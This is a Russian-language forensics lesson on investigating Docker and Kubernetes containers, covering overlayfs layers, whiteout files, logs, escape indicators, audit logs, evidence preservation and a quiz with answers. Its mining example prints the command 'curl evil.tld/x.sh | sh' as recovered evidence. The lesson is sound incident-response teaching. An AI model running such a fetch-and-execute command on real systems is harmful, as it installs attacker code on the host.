---
id: forensics-containers
title: "Форензика контейнеров и Docker"
category: forensics
parent: forensics-linux-artifacts
difficulty: medium
order: 1
tags: [docker, container, overlayfs, kubernetes, namespace, escape, forensics]
prerequisites: [forensics-linux-artifacts]
useful_for:
  - "CTF Forensics категория"
  - "Incident Response (контейнеры)"
  - "Анализ Docker/K8s"
estimated_minutes: 40
summary: "Анализ контейнеров и Docker: слои overlayfs, конфигурации, логи, escape-артефакты, форензика Kubernetes и восстановление изменений без перезаписи контейнера."
---
Контейнеры (Docker, containerd, Kubernetes) изменили модель развёртывания и добавили новые форензические сложности: слои overlayfs, эфемерные контейнеры, общие ядра. Расследование инцидента в контейнере требует анализа слоёв, конфигураций, логов и следов escape. Этот урок — про форензику Docker и Kubernetes без разрушения улик.

## Модель контейнера

Контейнер — это процесс на хосте, изолированный namespaces (PID, mount, net, UTS, IPC) и ограниченный cgroups. Файловая система — набор **слоёв** overlayfs: нижние (read-only образы) и верхний (writable, изменения контейнера). Удаление файла в контейнере создаёт **whiteout**-файл в верхнем слое, а не физическое удаление.

```bash
$ docker inspect <id> | jq '.[0].GraphDriver.Data'
{
  "LowerDir": "/var/lib/docker/overlay2/abc.../diff:...",
  "UpperDir": "/var/lib/docker/overlay2/abc.../diff",
  "MergedDir": "/var/lib/docker/overlay2/abc.../merged",
  "WorkDir": "/var/lib/docker/overlay2/abc.../work"
}
```

## Где лежат данные Docker

| Путь | Содержимое |
|------|-----------|
| `/var/lib/docker/containers/<id>/` | конфиги, `*-json.log` (stdout/stderr) |
| `/var/lib/docker/overlay2/` | слои образов и контейнеров |
| `/var/lib/docker/image/overlay2/` | метаданные образов |
| `/var/lib/docker/volumes/` | именованные тома |
| `/var/lib/docker/network/` | настройки сетей |

```bash
# логи контейнера (JSON)
$ cat /var/lib/docker/containers/<id>/<id>-json.log | jq -r '.log' | head
$ docker logs <id> --since 2024-03-01
# история образа (слои)
$ docker history --no-trunc image:tag
# конфиг контейнера
$ cat /var/lib/docker/containers/<id>/config.v2.json | jq '.Config.Cmd,.Config.Env'
```

## Анализ слоёв overlayfs

Изменения контейнера видны в верхнем слое (`UpperDir`). Если контейнер удалён, слой может остаться — это «призрак» для восстановления.

```bash
# найти верхний слой контейнера и изменения
$ ls -la /var/lib/docker/overlay2/<id>/diff/
# whiteout-файлы (удаления)
$ find /var/lib/docker/overlay2/<id>/diff -name '.wh.*'
# сравнить слои образа
$ for d in /var/lib/docker/overlay2/*/diff; do echo "== $d"; find $d -newermt '2024-03-01' -type f; done
```

`whiteout` (`.wh.filename`) означает, что файл удалён в этом слое, но существует в нижнем — восстановите его из нижнего слоя. Это ключ к поиску удалённых внутри контейнера файлов.

## Закрепление и escape

Атакующий внутри контейнера может закрепиться через:
- **изменения в образе** (пересобрать и запушить);
- **volume** (запись в смонтированный том хоста);
- **cron/systemd** хоста (если смонтированы);
- **Kubernetes**: `DaemonSet`/`CronJob`, `hostPath`-mount, привилегированные поды.

**Escape-артефакты**: привилегированный контейнер (`--privileged`), `docker.sock` внутри контейнера, `hostPID`/`hostNetwork`, монтирование `/`, модули ядра.

```bash
# контейнер с доступом к docker.sock
$ find / -name docker.sock 2>/dev/null
# привилегированные поды (K8s)
$ kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
# hostPath-монтирования
$ kubectl get pods -o json | jq '.items[] | select(.spec.volumes[].hostPath!=null) | .metadata.name'
```

## Kubernetes-форензика

Источники: API-сервер audit log, `kubelet`-логи, `etcd`, события, спеки подов.

```bash
# события кластера
$ kubectl get events -A --sort-by=.lastTimestamp | tail -30
# audit log (если включён)
$ grep -iE 'create|delete|exec|attach' /var/log/kubernetes/audit.log | head
# кто выполнял exec в под
$ jq 'select(.verb=="create" and .objectRef.subresource=="exec")' audit.log
# etcd — состояние кластера
$ etcdctl get /registry/pods --prefix --keys-only | head
```

`kubectl exec`/`attach` фиксируются в audit log — это прямой след вторжения в под. Секреты лежат в etcd (часто не зашифрованы).

## Разобранный пример

Подозрение: контейнер использован для майнинга.

```bash
# 1. Аномальный CPU-контейнер
$ docker stats --no-stream
CONTAINER ID   NAME        CPU %
abc123         miner       398%
# 2. Команда запуска
$ docker inspect abc123 | jq '.[0].Config.Cmd,.[0].Config.Image'
["/bin/sh","-c","curl evil.tld/x.sh | sh"]
# 3. Логи
$ docker logs abc123 2>&1 | head
Downloading miner...
# 4. Изменения в верхнем слое
$ find /var/lib/docker/overlay2/abc123/diff -type f -newermt '-1 day'
/var/lib/docker/overlay2/abc123/diff/tmp/xmrig
# 5. Хеш бинаря
$ sha256sum /var/lib/docker/overlay2/abc123/diff/tmp/xmrig
```

Итог: контейнер запущен с командой скачивания скрипта, в верхнем слое остался бинарь майнера.

## Справочная таблица

| Задача | Инструмент/путь |
|--------|-----------------|
| Логи контейнера | `docker logs`, `*-json.log` |
| Конфиг | `docker inspect`, `config.v2.json` |
| Слои | `/var/lib/docker/overlay2/*/diff` |
| Удаления | `.wh.*` (whiteout) |
| K8s-события | `kubectl get events` |
| K8s-audit | audit log + `jq` |
| Секреты | `etcdctl`, `kubectl get secret` |

## Частые ошибки

- **`docker exec` в скомпрометированный контейнер** — меняет состояние; снимайте образ (`docker commit`/`export`) сначала.
- **Игнорировать whiteout** — удалённое внутри контейнера восстанавливается из нижнего слоя.
- **Не смотреть hostPath/privileged** — там следы escape.
- **Забывать про volumes** — данные вне слоёв контейнера.
- **Пропустить audit log K8s** — без него нет атрибуции `exec`.
- **Считать контейнер «изолированным»** — общее ядро означает общие артефакты.

## Что дальше / решение

Конвейер: `docker inspect` (конфиг) → `*-json.log` (логи) → анализ `UpperDir`/whiteout (изменения) → проверка volumes/hostPath (escape) → для K8s — audit log + etcd. Связка: `forensics-linux-artifacts` (хост), `forensics-k8s` (глубоко), `forensics-docker-k8s` (атаки), `forensics-malware-yara` (бинарники).

## Извлечение образа контейнера без остановки

Чтобы не разрушать улику, снимите копию файловой системы контейнера до любых действий.

```bash
# экспорт файловой системы (не запускает контейнер)
$ docker export <id> -o container.tar
$ mkdir rootfs && tar -xf container.tar -C rootfs/
# commit в образ (для сохранения состояния)
$ docker commit <id> forensic/<case>:snapshot
# копия верхнего слоя напрямую
$ cp -a /var/lib/docker/overlay2/<id>/diff ./snapshot_upper
# полный дамп через containerd/CRI (для k8s)
$ crictl inspect <id> | jq '.info.runtimeSpec'
```

`docker export` даёт слитую ФС (merged) без метаданных слоёв; для сохранения истории слоёв копируйте `overlay2`. Не запускайте `docker exec` в подозрительный контейнер — это изменит состояние и может активировать малварь.

## Аудит Docker daemon и хоста

```bash
# конфигурация daemon
$ cat /etc/docker/daemon.json
$ systemctl status docker
# все контейнеры, включая остановленные
$ docker ps -a --no-trunc
# события daemon (запуск/остановка/exec)
$ journalctl -u docker --since '2024-03-01' | grep -iE 'start|exec|create'
$ docker events --since '2024-03-01' --until '2024-03-02'
# образы, включая dangling
$ docker images -a
$ docker image history <image>
```

`docker events`/`journalctl -u docker` фиксируют `exec_create`, `start`, `attach` — прямые следы действий атакующего. Проверяйте `authorized_keys`, cron и systemd на **хосте** (контейнеры с `--privileged`/hostPath могли их изменить).

## Проброс и риски конфигурации

| Конфигурация | Риск |
|--------------|------|
| `--privileged` | полный доступ к хосту |
| `-v /:/host` | запись на хост |
| `-v /var/run/docker.sock` | управление Docker из контейнера |
| `--pid=host`/`--net=host` | доступ к процессам/сети хоста |
| `--cap-add SYS_ADMIN` | потенциальный escape |
| `securityContext.privileged` (K8s) | то же для подов |

## Сравнение с хостом

Контейнерные артефакты бессмысленны в отрыве от хоста: сопоставляйте время создания слоя с логами хоста (`journalctl`, `auditd`), проверяйте, какие процессы хоста породили контейнер, и ищите общие точки (смонтированные тома, сетевые namespace).

## Квиз

```quiz
- question: "Где хранятся изменения (записываемый слой) контейнера?"
  options:
    - "в LowerDir"
    - "в UpperDir"
    - "в образе"
    - "в ядре"
  answer: 1
- question: "Что означает файл `.wh.<name>` в upperdir?"
  options:
    - "белый список"
    - "удалённый в контейнере файл (whiteout)"
    - "скрытый файл"
    - "том"
  answer: 1
- question: "Как получить «плоскую» ФС контейнера?"
  options:
    - "`docker export`"
    - "`docker run`"
    - "`docker ps`"
    - "`docker logs`"
  answer: 0
- question: "Какой признак опасной конфигурации контейнера?"
  options:
    - "непривилегированный"
    - "`Privileged: true` + примонтированный docker.sock"
    - "сетевое имя"
    - "образ из registry"
  answer: 1
- question: "Где токен сервис-аккаунта в Kubernetes-поде?"
  options:
    - "`/etc/passwd`"
    - "`/var/run/secrets/kubernetes.io/serviceaccount/token`"
    - "в логах"
    - "в CronJob"
  answer: 1
```

## Где пригодится

- **CTF:** задачи с образами/дампами контейнеров.
- **Cloud IR:** расследование контейнерных инцидентов.
- **DevOps-безопасность:** аудит конфигураций.
- **K8s-безопасность:** выявление escape и эскалаций.
- **Пентест:** понимание следов в контейнерной среде.
